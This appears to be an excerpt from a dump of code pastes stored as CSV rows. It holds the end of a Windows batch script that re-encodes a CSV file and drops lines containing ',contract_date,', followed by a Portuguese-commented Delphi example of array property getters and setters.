:: src [in]     - source file name to be converted
:: trg [in,opt] - target file name, leave blank for in-place conversion

set src=%~1
set trg=%~2
set tmp=%temp%.\%~nx1
if ""%trg%""=="""" set trg=%src%

:header
for /f ""delims="" %%a in (%src%) do (
    echo %%a > %tmp%
    goto :body
)

:body
CHCP 1251 >NUL
cmd /D /A /c type ""%src%"" | find /v /i "",contract_date,"">>""%tmp%""
move /y ""%tmp%"" ""%trg%""

ECHO Check your new %trg% in:
ECHO %~ftz1%
PAUSE"
x1rj7zkb,Exemplos de set e get de arrays em Delphi,jacknpoe,Delphi,Thursday 29th of February 2024 07:38:49 AM CDT,"unit Classe;

interface

Type
TClasse = class
  private
    fQuantidade: integer;
    fPagamentos: array of integer;
    fPesos: array of double;
  public
    function GetQuantidade: integer;
    procedure SetQuantidade(valor: integer);
    function GetPagamentos(indice: integer): integer;
    procedure SetPagamentos(indice: integer; valor: integer);
    function GetPesos(indice: integer): double;
    procedure SetPesos(indice: integer; valor: double);
  published
    property Quantidade: integer read GetQuantidade write SetQuantidade;
    property Pagamentos[indice: integer]: integer read GetPagamentos write SetPagamentos;
    property Pesos[indice: integer]: double read GetPesos write SetPesos;
end;

implementation

function TClasse.GetQuantidade: integer;
begin
  result := fQuantidade;
end;

procedure TClasse.SetQuantidade(valor: integer);
begin
  if (valor < 0) then
  begin
    exit;
  end;
  fQuantidade := valor;
  SetLength(fPagamentos, valor);
  SetLength(fPesos, valor);
end;

function TClasse.GetPagamentos(indice: integer): integer;
begin
  if (indice < 0) or (indice >= fQuantidade) then
  begin
    result := 0;
    exit;
  end;
  result := fPagamentos[indice];
end;

procedure TClasse.SetPagamentos(indice: integer; valor: integer);
begin
  if (indice < 0) or (indice >= fQuantidade) then
  begin
    exit;
  end;
  fPagamentos[indice] := valor;
end;

function TClasse.GetPesos(indice: integer): double;
begin
  if (indice < 0) or (indice >= fQuantidade) then
  begin
    result := 0.0;
    exit;
  end;
  result := fPesos[indice];
end;

procedure TClasse.SetPesos(indice: integer; valor: double);
begin
  if (indice < 0) or (indice >= fQuantidade) then
  begin
    exit;
  end;
  fPesos[indice] := valor;
end;

end."
